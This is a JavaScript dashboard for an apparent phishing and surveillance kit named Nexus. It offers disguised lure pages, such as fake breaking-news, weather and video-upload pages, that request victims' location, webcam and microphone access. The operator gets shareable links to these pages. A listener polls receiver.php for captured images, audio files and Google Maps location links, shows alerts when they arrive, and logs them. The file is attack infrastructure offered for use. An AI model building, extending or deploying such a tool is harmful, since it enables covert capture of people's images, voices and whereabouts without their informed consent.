// Dashboard JavaScript
var old_data = '';
var listenerTimer = null;
var isListenerRunning = true;

// Functionality definitions with icons
const functionalities = {
    'breaking_news': {
        icon: 'fa-newspaper',
        title: 'Breaking News',
        description: 'Display breaking news with location access',
        color: '#ef4444'
    },
    'live_news': {
        icon: 'fa-broadcast-tower',
        title: 'Live News',
        description: 'Real-time live news coverage',
        color: '#f59e0b'
    },
    'news_location': {
        icon: 'fa-map-marker-alt',
        title: 'News Location',
        description: 'Location-based news updates',
        color: '#10b981'
    },
    'camera_temp': {
        icon: 'fa-camera',
        title: 'Camera Access',
        description: 'Request webcam access',
        color: '#6366f1'
    },
    'microphone': {
        icon: 'fa-microphone',
        title: 'Microphone Access',
        description: 'Request microphone access',
        color: '#8b5cf6'
    },
    'audio_news': {
        icon: 'fa-headphones',
        title: 'Audio News',
        description: 'Audio-based news content',
        color: '#ec4899'
    },
    'weather': {
        icon: 'fa-cloud-sun',
        title: 'Weather',
        description: 'Weather information with location',
        color: '#06b6d4'
    },
    'nearyou': {
        icon: 'fa-location-dot',
        title: 'Near You',
        description: 'Location-based services',
        color: '#14b8a6'
    },
    'normal_data': {
        icon: 'fa-database',
        title: 'Data Collection',
        description: 'General data collection template',
        color: '#64748b'
    },
    'video_upload': {
        icon: 'fa-video',
        title: 'Video Upload',
        description: 'Upload videos with location and camera verification',
        color: '#ec4899'
    }
};

// Special cards (not templates)
const specialCards = [
    {
        icon: 'fa-cog',
        title: 'News Management',
        description: 'Manage and add breaking news items',
        color: '#6366f1',
        action: 'openNewsAdmin'
    }
];

// Initialize dashboard
$(document).ready(function() {
    loadTemplates();
    startListener();
    setupEventHandlers();
});

// Templates to exclude from dashboard
const excludedTemplates = ['audio_news', 'live_news', 'nearyou', 'news_location'];

// Load templates and create grid
function loadTemplates() {
    $.post("list_templates.php", function(data) {
        const templates = JSON.parse(data);
        const grid = $('#functionalities-grid');
        grid.empty();
        
        // Add special cards first
        specialCards.forEach((card, index) => {
            const specialCard = createSpecialCard(card, index);
            grid.append(specialCard);
        });
        
        // Filter out excluded templates and add template cards
        let cardIndex = specialCards.length;
        templates.forEach((template) => {
            // Skip excluded templates
            if (excludedTemplates.includes(template)) {
                return;
            }
            
            const func = functionalities[template] || {
                icon: 'fa-cube',
                title: template.replace('_', ' ').replace(/\b\w/g, l => l.toUpperCase()),
                description: 'Template functionality',
                color: '#6366f1'
            };
            
            const card = createFunctionalityCard(template, func, cardIndex);
            grid.append(card);
            cardIndex++;
        });
    });
}

// Create functionality card
function createFunctionalityCard(template, func, index) {
    const baseUrl = window.location.origin;
    const templateUrl = `${baseUrl}/templates/${template}/index.html`;
    
    return $(`
        <div class="functionality-card" data-template="${template}" style="animation-delay: ${index * 0.1}s">
            <div class="functionality-icon" style="background: linear-gradient(135deg, ${func.color}, ${func.color}dd);">
                <i class="fas ${func.icon}"></i>
            </div>
            <h3 class="functionality-title">${func.title}</h3>
            <p class="functionality-description">${func.description}</p>
            <span class="functionality-badge">Template</span>
            <div class="mt-3">
                <button class="btn btn-sm btn-primary w-100" onclick="showTemplateLink('${template}', '${templateUrl}')">
                    <i class="fas fa-link"></i> Get Link
                </button>
            </div>
        </div>
    `);
}

// Create special card (not a template)
function createSpecialCard(card, index) {
    return $(`
        <div class="functionality-card" style="animation-delay: ${index * 0.1}s">
            <div class="functionality-icon" style="background: linear-gradient(135deg, ${card.color}, ${card.color}dd);">
                <i class="fas ${card.icon}"></i>
            </div>
            <h3 class="functionality-title">${card.title}</h3>
            <p class="functionality-description">${card.description}</p>
            <span class="functionality-badge">Management</span>
            <div class="mt-3">
                <button class="btn btn-sm btn-primary w-100" onclick="${card.action}()">
                    <i class="fas fa-cog"></i> Open
                </button>
            </div>
        </div>
    `);
}

// Open news admin
function openNewsAdmin() {
    window.location.href = 'news_admin.php';
}

// Show template link modal
function showTemplateLink(template, url) {
    $('#template-link').val(url);
    const modal = new bootstrap.Modal(document.getElementById('templateModal'));
    modal.show();
}

// Copy template link
function copyTemplateLink() {
    const linkInput = document.getElementById('template-link');
    linkInput.select();
    document.execCommand('copy');
    
    Swal.fire({
        icon: 'success',
        title: 'Link Copied!',
        text: 'Template link has been copied to clipboard',
        timer: 2000,
        showConfirmButton: false
    });
}

// Listener functions
function startListener() {
    if (listenerTimer) return;
    
    listenerTimer = setInterval(function() {
        $.post("receiver.php", {"send_me_result": ""}, function(data) {
            if (data != "") {
                handleReceivedData(data);
            }
        });
    }, 2000);
    
    updateListenerStatus(true);
}

function stopListener() {
    if (listenerTimer) {
        clearInterval(listenerTimer);
        listenerTimer = null;
    }
    updateListenerStatus(false);
}

function updateListenerStatus(isRunning) {
    isListenerRunning = isRunning;
    const statusBadge = $('#listener-status');
    const btn = $('#btn-listen');
    
    if (isRunning) {
        statusBadge.removeClass('bg-danger').addClass('bg-success')
            .html('<i class="fas fa-circle"></i> Listener Active');
        btn.removeClass('btn-success').addClass('btn-danger')
            .html('<i class="fas fa-stop-circle"></i> Stop Listener');
    } else {
        statusBadge.removeClass('bg-success').addClass('bg-danger')
            .html('<i class="fas fa-circle"></i> Listener Stopped');
        btn.removeClass('btn-danger').addClass('btn-success')
            .html('<i class="fas fa-play-circle"></i> Start Listener');
    }
}

// Handle received data
function handleReceivedData(data) {
    if (data.includes("Image")) {
        showNotification("Image File Saved", 'Path: ' + data.slice(26), true, 'success');
    } else if (data.includes("Audio")) {
        showNotification("Audio File Saved", 'Path: ' + data.slice(26), true, 'success');
    } else if (data.includes("Google Map")) {
        showNotification("Google Map Link", data.slice(18), true, 'info');
    }
    
    old_data += data + "\n-------------------------\n";
    $("#result").val(old_data);
}

// Show notification
function showNotification(title, message, showButton, type) {
    const btnText = message.includes("available") || message.includes("Google Map") ? "Open Link" : "Open File";
    const timer = message.includes("available") ? 0 : 5000;
    
    GrowlNotification.notify({
        title: title,
        description: message,
        type: type || 'success',
        closeTimeout: timer,
        showProgress: true,
        showButtons: showButton,
        buttons: {
            action: {
                text: btnText,
                callback: function() {
                    const path = message.replace("Path: ", "").replace("Path : ", "");
                    window.open(path, 'popUpWindow', 'height=640,width=640,left=1000,top=300,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no,status=yes');
                }
            },
            cancel: {
                text: 'Cancel',
                callback: function() {}
            }
        }
    });
}

// Setup event handlers
function setupEventHandlers() {
    // Listener toggle
    $('#btn-listen').click(function() {
        if (isListenerRunning) {
            stopListener();
        } else {
            startListener();
        }
    });
    
    // Clear logs
    $('#btn-clear').click(function() {
        $("#result").val("");
        old_data = "";
        Swal.fire({
            icon: 'success',
            title: 'Logs Cleared',
            timer: 1500,
            showConfirmButton: false
        });
    });
}

// Download logs
function downloadLogs() {
    const text = $("#result").val();
    if (!text.trim()) {
        Swal.fire({
            icon: 'warning',
            title: 'No Logs',
            text: 'There are no logs to download'
        });
        return;
    }
    
    const blob = new Blob([text], {type: 'text/plain'});
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `nexus_logs_${Date.now()}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    window.URL.revokeObjectURL(url);
}

// Toggle logs section
function toggleLogs() {
    const content = $('#logs-content');
    const icon = $('#logs-toggle-icon');
    
    if (content.hasClass('collapsed')) {
        content.removeClass('collapsed');
        icon.removeClass('fa-chevron-down').addClass('fa-chevron-up');
    } else {
        content.addClass('collapsed');
        icon.removeClass('fa-chevron-up').addClass('fa-chevron-down');
    }
}

// Check for updates (from original script.js)
function check_new_version() {
    var last_version = 0;
    $.get("Settings.json", function(data) {
        last_version += data.version;
        
        function check_version_on_git() {
            $.get("https://raw.githubusercontent.com/ultrasecurity/Nexus/main/Settings.json", function(data) {
                try {
                    const new_version = JSON.parse(data);
                    if (last_version < new_version.version) {
                        showNotification("New version available :)", "https://github.com/ultrasecurity/Nexus", true, 'info');
                    }
                } catch (e) {
                    console.error('Error checking version:', e);
                }
            }).fail(function() {
                console.log('Could not check for updates');
            });
        }
        
        setTimeout(check_version_on_git, 2000);
    });
}

